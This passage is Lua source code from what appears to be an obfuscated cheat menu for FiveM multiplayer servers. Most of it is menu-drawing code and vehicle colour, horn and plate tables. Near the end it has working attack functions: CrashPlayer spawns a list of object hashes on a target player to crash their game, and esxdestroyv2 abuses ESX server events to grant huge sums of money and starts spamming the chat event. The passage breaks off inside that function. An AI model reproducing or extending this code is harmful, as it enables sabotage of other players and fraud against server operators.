            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, KZjx, KZjx, waduyh487r64)
        end
    end
end


local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = WADUI

    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
        multiplier = optionCount
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = WADUI
        local textColor = WADUI
        local subTextColor = WADUI
        local shadow = KZjx

        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = waduyh487r64
        end

        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, KZjx, shadow)

        if subText then
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, KZjx, shadow, waduyh487r64)
        end
    end
end


function Wugr4yfgb(id, title)
    menus[id] = { }
    menus[id].title = title

    menus[id].visible = KZjx

    menus[id].previousMenu = WADUI

    menus[id].aboutToBeClosed = KZjx

    menus[id].x = 0.75
    menus[id].y = 0.1
    menus[id].width = 0.225

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 13

    menus[id].titleFont = 1
    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
    menus[id].titleBackgroundSprite = WADUI

    menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuFocusTextColor = { r = 255, g = 0, b = 0, a = 200 }
    menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
    menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }

    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }

    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }

    debugPrint(tostring(id).." menu created")
end


function di9hwdn(id, parent, subTitle)
    if menus[parent] then
        Wugr4yfgb(id, menus[parent].title)

        if subTitle then
            setMenuProperty(id, "subTitle", string.upper(subTitle))
        else
            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
        end

        setMenuProperty(id, "previousMenu", parent)

        setMenuProperty(id, "x", menus[parent].x)
        setMenuProperty(id, "y", menus[parent].y)
        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
        setMenuProperty(id, "titleFont", menus[parent].titleFont)
        setMenuProperty(id, "titleColor", menus[parent].titleColor)
        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
    else
        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
    end
end


function Plane.CurrentMenu()
    return currentMenu
end


function trynaskidhuh(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)
        setMenuVisible(id, waduyh487r64)
        debugPrint(tostring(id).." menu opened")
    else
        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
    end
end


function Plane.IsMenuOpened(id)
    return isMenuVisible(id)
end


function Plane.IsAnyMenuOpened()
    for id, _ in pairs(menus) do
        if isMenuVisible(id) then return waduyh487r64 end
    end

    return KZjx
end


function Plane.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return KZjx
    end
end


function Plane.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = KZjx
            setMenuVisible(currentMenu, KZjx)
            debugPrint(tostring(currentMenu).." menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)
            optionCount = 0
            currentMenu = WADUI
            currentKey = WADUI
        else
            menus[currentMenu].aboutToBeClosed = waduyh487r64
            debugPrint(tostring(currentMenu).." menu about to be closed")
        end
    end
end


function IlIlIlIlIlI(text, subText)
    local buttonText = text
    if subText then
        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
    end

    if menus[currentMenu] then
        optionCount = optionCount + 1

        local isCurrent = menus[currentMenu].currentOption == optionCount

        drawButton(text, subText)

        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, waduyh487r64)
                debugPrint(buttonText.." button pressed")
                return waduyh487r64
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)
            end
        end

        return KZjx
    else
        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")

        return KZjx
    end
end


function LDOWJDWDdddwdwdad(text, id)
    if menus[id] then
        if IlIlIlIlIlI(text) then
            setMenuVisible(currentMenu, KZjx)
            setMenuVisible(id, waduyh487r64, waduyh487r64)

            return waduyh487r64
        end
    else
        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
    end

    return KZjx
end

local bm = {
    {
        name = "~h~~r~Engine",
        id = 11
    },
    {
        name = "~h~~b~Brakes",
        id = 12
    },
    {
        name = "~h~~g~Transmission",
        id = 13
    },
    {
        name = "~h~~y~Suspension",
        id = 15
    },
    {
        name = "~h~~b~Armor",
        id = 16
    }
}

function IlIlIlI(text, checked, callback)
    if IlIlIlIlIlI(text, checked and "~g~~h~On" or "~h~~c~Off") then
        checked = not checked
        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
        if callback then callback(checked) end

        return waduyh487r64
    end

    return KZjx
end


function LiLLL(text, items, CURENTIXDDd, DWADIOHDWwww13, callback)
    local itemsCount = #items
    local selectedItem = items[CURENTIXDDd]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if IlIlIlIlIlI(text, selectedItem) then
        DWADIOHDWwww13 = CURENTIXDDd
        callback(CURENTIXDDd, DWADIOHDWwww13)
        return waduyh487r64
    elseif isCurrent then
        if currentKey == keys.left then
            if CURENTIXDDd > 1 then CURENTIXDDd = CURENTIXDDd - 1 else CURENTIXDDd = itemsCount end
        elseif currentKey == keys.right then
            if CURENTIXDDd < itemsCount then CURENTIXDDd = CURENTIXDDd + 1 else CURENTIXDDd = 1 end
        end
    else
        CURENTIXDDd = DWADIOHDWwww13
    end

    callback(CURENTIXDDd, DWADIOHDWwww13)
    return KZjx
end

function ililililil()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            Plane.CloseMenu()
        else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = WADUI

            if IsControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)

                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)

                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", waduyh487r64)
                    setMenuVisible(menus[currentMenu].previousMenu, waduyh487r64)
                else
                    Plane.CloseMenu()
                end
            end

            optionCount = 0
        end
    end
end


function Plane.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function Plane.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function Plane.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function Plane.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function Plane.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function Plane.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function Plane.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function Plane.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function Plane.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function Plane.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function Plane.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function Plane.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function Plane.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function Plane.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
end

function adyt23h23(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(KZjx, KZjx)
end
-- Luminous

function getEntity(player)
    local awd2323, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
 end

 local bn = {
    {
        name = "~h~Blue on White 2",
        id = 0
    },
    {
        name = "~h~Blue on White 3",
        id = 4
    },
    {
        name = "~h~Yellow on Blue",
        id = 2
    },
    {
        name = "~h~Yellow on Black",
        id = 1
    },
    {
        name = "~h~North Yankton",
        id = 5
    }
}
-- Made by PlAne#0007
local bp = {
    ["Stock Horn"] = -1,
    ["Truck Horn"] = 1,
    ["Police Horn"] = 2,
    ["Clown Horn"] = 3,
    ["Musical Horn 1"] = 4,
    ["Musical Horn 2"] = 5,
    ["Musical Horn 3"] = 6,
    ["Musical Horn 4"] = 7,
    ["Musical Horn 5"] = 8,
    ["Sad Trombone Horn"] = 9,
    ["Classical Horn 1"] = 10,
    ["Classical Horn 2"] = 11,
    ["Classical Horn 3"] = 12,
    ["Classical Horn 4"] = 13,
    ["Classical Horn 5"] = 14,
    ["Classical Horn 6"] = 15,
    ["Classical Horn 7"] = 16,
    ["Scaledo Horn"] = 17,
    ["Scalere Horn"] = 18,
    ["Salemi Horn"] = 19,
    ["Scalefa Horn"] = 20,
    ["Scalesol Horn"] = 21,
    ["Scalela Horn"] = 22,
    ["Scaleti Horn"] = 23,
    ["Scaledo Horn High"] = 24,
    ["Jazz Horn 1"] = 25,
    ["Jazz Horn 2"] = 26,
    ["Jazz Horn 3"] = 27,
    ["Jazz Loop Horn"] = 28,
    ["Starspangban Horn 1"] = 28,
    ["Starspangban Horn 2"] = 29,
    ["Starspangban Horn 3"] = 30,
    ["Starspangban Horn 4"] = 31,
    ["Classical Loop 1"] = 32,
    ["Classical Horn 8"] = 33,
    ["Classical Loop 2"] = 34
}
local bq = {
    ["White"] = {
        255,
        255,
        255
    },
    ["Blue"] = {
        0,
        0,
        255
    },
    ["Electric Blue"] = {
        0,
        150,
        255
    },
    ["Mint Green"] = {
        50,
        255,
        155
    },
    ["Lime Green"] = {
        0,
        255,
        0
    },
    ["Yellow"] = {
        255,
        255,
        0
    },
    ["Golden Shower"] = {
        204,
        204,
        0
    },
    ["Orange"] = {
        255,
        128,
        0
    },
    ["Red"] = {
        255,
        0,
        0
    },
    ["Pony Pink"] = {
        255,
        102,
        255
    },
    ["Hot Pink"] = {
        255,
        0,
        255
    },
    ["Purple"] = {
        153,
        0,
        153
    }
}

-- Luminous
local br = {
    {
        name = "~h~Black",
        id = 0
    },
    {
        name = "~h~Carbon Black",
        id = 147
    },
    {
        name = "~h~Graphite",
        id = 1
    },
    {
        name = "~h~Anhracite Black",
        id = 11
    },
    {
        name = "~h~Black Steel",
        id = 2
    },
    {
        name = "~h~Dark Steel",
        id = 3
    },
    {
        name = "~h~Silver",
        id = 4
    },
    {
        name = "~h~Bluish Silver",
        id = 5
    },
    {
        name = "~h~Rolled Steel",
        id = 6
    },
    {
        name = "~h~Shadow Silver",
        id = 7
    },
    {
        name = "~h~Stone Silver",
        id = 8
    },
    {
        name = "~h~Midnight Silver",
        id = 9
    },
    {
        name = "~h~Cast Iron Silver",
        id = 10
    },
    {
        name = "~h~Red",
        id = 27
    },
    {
        name = "~h~Torino Red",
        id = 28
    },
    {
        name = "~h~Formula Red",
        id = 29
    },
    {
        name = "~h~Lava Red",
        id = 150
    },
    {
        name = "~h~Blaze Red",
        id = 30
    },
    {
        name = "~h~Grace Red",
        id = 31
    },
    {
        name = "~h~Garnet Red",
        id = 32
    },
    {
        name = "~h~Sunset Red",
        id = 33
    },
    {
        name = "~h~Cabernet Red",
        id = 34
    },
    {
        name = "~h~Wine Red",
        id = 143
    },
    {
        name = "~h~Candy Red",
        id = 35
    },
    {
        name = "~h~Hot Pink",
        id = 135
    },
    {
        name = "~h~Pfsiter Pink",
        id = 137
    },
    {
        name = "~h~Salmon Pink",
        id = 136
    },
    {
        name = "~h~Sunrise Orange",
        id = 36
    },
    {
        name = "~h~Orange",
        id = 38
    },
    {
        name = "~h~Bright Orange",
        id = 138
    },
    {
        name = "~h~Gold",
        id = 99
    },
    {
        name = "~h~Bronze",
        id = 90
    },
    {
        name = "~h~Yellow",
        id = 88
    },
    {
        name = "~h~Race Yellow",
        id = 89
    },
    {
        name = "~h~Dew Yellow",
        id = 91
    },
    {
        name = "~h~Dark Green",
        id = 49
    },
    {
        name = "~h~Racing Green",
        id = 50
    },
    {
        name = "~h~Sea Green",
        id = 51
    },
    {
        name = "~h~Olive Green",
        id = 52
    },
    {
        name = "~h~Bright Green",
        id = 53
    },
    {
        name = "~h~Gasoline Green",
        id = 54
    },
    {
        name = "~h~Lime Green",
        id = 92
    },
    {
        name = "~h~Midnight Blue",
        id = 141
    },
    {
        name = "~h~Galaxy Blue",
        id = 61
    },
    {
        name = "~h~Dark Blue",
        id = 62
    },
    {
        name = "~h~Saxon Blue",
        id = 63
    },
    {
        name = "~h~Blue",
        id = 64
    },
    {
        name = "~h~Mariner Blue",
        id = 65
    },
    {
        name = "~h~Harbor Blue",
        id = 66
    },
    {
        name = "~h~Diamond Blue",
        id = 67
    },
    {
        name = "~h~Surf Blue",
        id = 68
    },
    {
        name = "~h~Nautical Blue",
        id = 69
    },
    {
        name = "~h~Racing Blue",
        id = 73
    },
    {
        name = "~h~Ultra Blue",
        id = 70
    },
    {
        name = "~h~Light Blue",
        id = 74
    },
    {
        name = "~h~Chocolate Brown",
        id = 96
    },
    {
        name = "~h~Bison Brown",
        id = 101
    },
    {
        name = "~h~Creeen Brown",
        id = 95
    },
    {
        name = "~h~Feltzer Brown",
        id = 94
    },
    {
        name = "~h~Maple Brown",
        id = 97
    },
    {
        name = "~h~Beechwood Brown",
        id = 103
    },
    {
        name = "~h~Sienna Brown",
        id = 104
    },
    {
        name = "~h~Saddle Brown",
        id = 98
    },
    {
        name = "~h~Moss Brown",
        id = 100
    },
    {
        name = "~h~Woodbeech Brown",
        id = 102
    },
    {
        name = "~h~Straw Brown",
        id = 99
    },
    {
        name = "~h~Sandy Brown",
        id = 105
    },
    {
        name = "~h~Bleached Brown",
        id = 106
    },
    {
        name = "~h~Schafter Purple",
        id = 71
    },
    {
        name = "~h~Spinnaker Purple",
        id = 72
    },
    {
        name = "~h~Midnight Purple",
        id = 142
    },
    {
        name = "~h~Bright Purple",
        id = 145
    },
    {
        name = "~h~Cream",
        id = 107
    },
    {
        name = "~h~Ice White",
        id = 111
    },
    {
        name = "~h~Frost White",
        id = 112
    }
}
local bt = {
    {
        name = "~h~Black",
        id = 12
    },
    {
        name = "~h~Gray",
        id = 13
    },
    {
        name = "~h~Light Gray",
        id = 14
    },
    {
        name = "~h~Ice White",
        id = 131
    },
    {
        name = "~h~Blue",
        id = 83
    },
    {
        name = "~h~Dark Blue",
        id = 82
    },
    {
        name = "~h~Midnight Blue",
        id = 84
    },
    {
        name = "~h~Midnight Purple",
        id = 149
    },
    {
        name = "~h~Schafter Purple",
        id = 148
    },
    {
        name = "~h~Red",
        id = 39
    },
    {
        name = "~h~Dark Red",
        id = 40
    },
    {
        name = "~h~Orange",
        id = 41
    },
    {
        name = "~h~Yellow",
        id = 42
    },
    {
        name = "~h~Lime Green",
        id = 55
    },
    {
        name = "~h~Green",
        id = 128
    },
    {
        name = "~h~Forest Green",
        id = 151
    },
    {
        name = "~h~Foliage Green",
        id = 155
    },
    {
        name = "~h~Olive Darb",
        id = 152
    },
    {
        name = "~h~Dark Earth",
        id = 153
    },
    {
        name = "~h~Desert Tan",
        id = 154
    }
}
local bu = {
    {
        name = "~h~Brushed Steel",
        id = 117
    },
    {
        name = "~h~Brushed Black Steel",
        id = 118
    },
    {
        name = "~h~Brushed Aluminum",
        id = 119
    },
    {
        name = "~h~Pure Gold",
        id = 158
    },
    {
        name = "~h~Brushed Gold",
        id = 159
    }
}
 

function MaxOut(vvvvvvvvvvvvvvvvvvvvvvvv)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 1) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 2) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 3) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 4) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 5) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 6) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 7) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 8) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 9) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 10) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 11) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 12) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 13) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 14, 16, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 15) - 2, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 16) - 1, KZjx)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 17, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 18, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 19, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 20, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 21, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 22, waduyh487r64)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 23, 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 24, 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 25) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 27) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 28) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 30) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 33) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 34) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 35) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 38) - 1, waduyh487r64)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), KZjx)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 5)
end

function MaxOutPerf(vvvvvvvvvvvvvvvvvvvvvvvv)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 11) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 12) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 13) - 1, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 15) - 2, KZjx)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 16) - 1, KZjx)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 17, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 18, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 19, waduyh487r64)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 21, waduyh487r64)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), KZjx)
end

function CrashPlayer(ped)
    local playerPos = GetEntityCoords(ped, KZjx)
    local keduxbenHashes = {
        0x34315488,
        0x6A27FEB1, 0xCB2ACC8,
        0xC6899CDE, 0xD14B5BA3,
        0xD9F4474C, 0x32A9996C,
        0x69D4F974, 0xCAFC1EC3,
        0x79B41171, 0x1075651,
        0xC07792D4, 0x781E451D,
        0x762657C6, 0xC2E75A21,
        0xC3C00861, 0x81FB3FF0,
        0x45EF7804, 0xE65EC0E4,
        0xE764D794, 0xFBF7D21F,
        0xE1AEB708, 0xA5E3D471,
        0xD971BBAE, 0xCF7A9A9D,
        0xC2CC99D8, 0x8FB233A4,
        0x24E08E1F, 0x337B2B54,
        0xB9402F87, 0x4F2526DA
    }

    for i = 1, #keduxbenHashes do
        obj = CreateObject(keduxbenHashes[i], playerPos.x, playerPos.y, playerPos.z, waduyh487r64, waduyh487r64, waduyh487r64)
    end
end

capPa = 'd' .. 'o' .. 'k' .. 'i'
cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
local bD = cappA

function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        udwdj('esx_jobs:caution', 'give_back', 9999999999)
                        udwdj('esx_fueldelivery:pay', 9999999999)
                        udwdj('esx_carthief:pay', 9999999999)
                        udwdj('esx_godirtyjob:pay', 9999999999)
                        udwdj('esx_pizza:pay', 9999999999)
                        udwdj('esx_ranger:pay', 9999999999)
                        udwdj('esx_garbagejob:pay', 9999999999)
                        udwdj('esx_truckerjob:pay', 9999999999)
                        udwdj('AdminMenu:giveBank', 9999999999)
                        udwdj('AdminMenu:giveCash', 9999999999)
                        udwdj('esx_gopostaljob:pay', 9999999999)
                        udwdj('esx_banksecurity:pay', 9999999999)
                        udwdj('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            udwdj(
                                '_chat:messageEntered',
